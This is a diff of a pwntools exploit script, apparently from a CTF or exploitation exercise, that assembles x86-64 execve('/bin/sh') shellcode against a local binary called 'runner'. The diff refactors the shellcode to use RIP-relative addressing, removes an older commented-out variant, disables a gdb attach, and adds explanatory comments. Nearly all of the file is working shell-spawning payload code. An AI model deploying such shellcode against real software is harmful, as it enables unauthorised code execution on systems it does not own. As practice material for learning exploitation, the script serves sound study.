@@ -8,27 +8,14 @@ c
 
 
 p = process("./runner")
-gdb.attach(p, gdbscript=gdb_script)
+# gdb.attach(p, gdbscript=gdb_script)
 
 context.arch = "amd64"
 
 binsh = u64(b"/bin/sh\x00")
 
-
 # Cannot LOAD DIRECT strings into RDI. NEED to load pointer
 EXECVE = 0x3B
-
-
-# Push RSP always points to the recently pushed item in stack
-# myShellCode = f"""
-#     mov rbx, {binsh}
-#     xor rsi, rsi
-#     xor rdx, rdx
-#     mov rax, 0x3b
-#     push rbx
-#     mov rdi, rsp
-#     syscall
-# """
 
 myShellCode = f""" 
 mov rax, {EXECVE}
@@ -41,10 +28,9 @@ syscall
 """
 
 shellCodeUseStack = f""" 
-    lea rbx, [rip + binsh]
+    lea rdi, [rip + binsh]
     xor rdx, rdx
     xor rsi, rsi
-    lea rdi, [rbx]
     mov rax, {EXECVE}
     syscall
 binsh: 
@@ -62,6 +48,12 @@ binsh:
 #   19:   2f                      (bad)
 #   1a:   62 69 6e 2f 73       lls   (bad)
 #   1f:   68                      .byte 0x68
+
+# lea rbx, [rip + binsh] uses RIP-relative addressing:
+# the assembler encodes a 32-bit displacement equal to binsh - next_ip.
+# At runtime, the hardware adds that to RIP.
+# This is the clean 64-bit way to do what the call/pop trick did. 👍
+
 
 payload = asm(shellCodeUseStack)
 print(disasm(payload))
